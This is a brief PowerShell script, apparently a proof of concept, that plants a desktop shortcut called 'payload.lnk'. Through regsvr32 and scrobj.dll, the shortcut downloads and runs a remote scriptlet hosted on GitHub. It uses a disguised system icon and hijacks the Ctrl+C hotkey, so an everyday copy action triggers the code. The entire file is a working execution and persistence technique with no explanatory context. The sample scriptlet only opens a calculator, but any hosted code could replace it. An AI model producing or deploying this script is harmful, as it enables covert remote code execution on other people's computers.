$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("desktop\payload.lnk")
$Shortcut.TargetPath = "%windir%/system32/regsvr32.exe"
$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"
$Shortcut.hotkey = "ctrl+c"
$Shortcut.Arguments = '/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll'
$Shortcut.Save()
